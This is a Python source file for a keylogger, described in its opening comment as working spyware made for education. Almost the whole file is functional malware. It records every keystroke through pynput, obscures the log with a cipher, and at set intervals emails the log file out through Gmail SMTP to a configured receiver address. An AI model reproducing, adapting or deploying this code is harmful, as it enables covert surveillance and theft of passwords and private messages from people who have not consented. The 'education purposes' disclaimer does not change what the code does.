# This is a working keylogger with spyware like functionality,
# I created this just for education purposes only, Don't use

import os
import smtplib
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from cipher import cipher_string, decode_logged_keys
from pynput.keyboard import Key, Listener


class KeyLogger:
    """
    Key logger class

    Configuration:
        offset (int):
            The offset to be used for the cipher
        jumps (int):
            No. of characters needed before shifting the offset.
            Should be always less than `chars`
        chars (int):
            No. of characters needed before writing to log.
            Should be always greater than `jumps`
        delim (str):
            The delimeter to be used to separate sessions.
            Don't use a common character.
    """

    START = False  # Used to check if the logger has started.
    CONFIG = {
        "offset": 11,
        "jumps": -1,
        "chars": 3,  # Set to at least the value of jumps
        "delim": "\u200b",  # Delimeter between sessions
    }

    def __init__(
        self,
        file_paths: dict,
        email: dict,
        interval: int = 60,
    ) -> None:
        """
        Instantiates the KeyLogger class

        Args:
            file_paths (dict): Contains the file paths for loggers
            email (dict): Contains both the sender and receiver email information
            interval (int, optional): Time in seconds before sending an email. Defaults to 60.
        """

        # Checks
        if not os.path.exists(os.path.dirname(file_paths["recorded_keys"])):
            print("The directory for the log file does not exist")
            os.makedirs(os.path.dirname(file_paths["recorded_keys"]))

        self.file_paths = file_paths
        self.email = email
        self.interval = interval
        self.keys = []
        self.last_email_time = time.time()

    def on_press(self, key: Key) -> None:
        """
        This function will be called whenever a key is pressed

        Args:
            key (Key): The key that was pressed
        """
        self.keys.append(key)

        # Write to the file if the number of characters reached max character limit
        if len(self.keys) >= KeyLogger.CONFIG["chars"]:
            self.write_file()
            if (time.time() - self.last_email_time) >= self.interval:
                self.send_email()

    def write_file(self) -> None:
        """
        Write encrypted keys to the file.
        """
        with open(self.file_paths["recorded_keys"], "a+", encoding="utf-8") as file:
            file.write(
                (
                    KeyLogger.CONFIG["delim"]
                    if not KeyLogger.START
                    else ""  # U+200B is a zero-width space
                )
                + cipher_string(
                    "".join(map(self.translate_key, self.keys)),
                    KeyLogger.CONFIG["offset"],
                    KeyLogger.CONFIG["jumps"],
                )
            )
        print("".join(map(self.translate_key, self.keys)))
        self.keys.clear()

        if not KeyLogger.START:
            KeyLogger.START = True

    def translate_key(self, key: Key) -> str:
        """
        Translate the KeyCode and return the string representation of it.

        Args:
            key (Key): The key to be translated
        """
        match key:
            case Key.enter:
                return "\n"
            case Key.space:
                return " "
            case Key.backspace:
                return "←"  # ? <- Needs review
            case _:
                if "Key" in str(key):  # Exclude modifier and special keys
                    return ""
                return str(key).replace("'", "")

    def send_email(self) -> None:
        """
        Send the email with the recorded keys.

        This method sends the logged file to the receiver email address.
        """
        filename = self.file_paths["recorded_keys"]
        source = self.email["sender"]["email"]
        target = self.email["receiver"]["email"]

        body = "body_of_the_mail"

        message = MIMEMultipart()
        message["From"] = source
        message["To"] = target
        message["Subject"] = "Log File"
        message.attach(MIMEText(body, "plain"))

        # Record the time when the email process started
        self.last_email_time = time.time()

        with open(filename, "rb") as attachment:
            try:
                # Add the attachment to the email
                payload = MIMEBase("application", "octet-stream")
                payload.set_payload(attachment.read())
                encoders.encode_base64(payload)
                payload.add_header(
                    "Content-Disposition",
                    f"attachment; filename={filename}",
                )
                message.attach(payload)

                # Send the email
                smtp = smtplib.SMTP("smtp.gmail.com", 587)
                smtp.starttls()
                smtp.login(source, self.email["sender"]["password"])
                smtp.sendmail(source, target, message.as_string())
                smtp.quit()

            except smtplib.SMTPAuthenticationError as e:
                print(
                    "Authentication Error:", e.smtp_code
                )  # ! Would loop persistently if not addressed
                return False
        return True

    def on_release(self, key) -> bool:
        """
        Terminates the keylogger when the escape key is pressed.
        """
        if key == Key.esc:
            return False
        return True


def main():
    # Headers

    file_paths = {
        "recorded_keys": os.path.join(os.getcwd(), "data/logged_keys.log"),
    }
    email = {
        "sender": {
            "email": "keylogger@domain.com",
            "password": "examplePassword",
        },
        "receiver": {
            "email": "keylogger@domain.com",
        },
    }

    # Start the keylogger
    print("\nStarting keylogger. Press ESC to stop.")

    logger = KeyLogger(file_paths, email)
    with Listener(on_press=logger.on_press, on_release=logger.on_release) as listener:
        listener.join()


if __name__ == "__main__":
    # * For debugging purposes only
    # Use this line below to decode the logged keys.
    print(
        "Decoded last log:",
        decode_logged_keys("data/logged_keys.log", KeyLogger.CONFIG),
    )

    main()
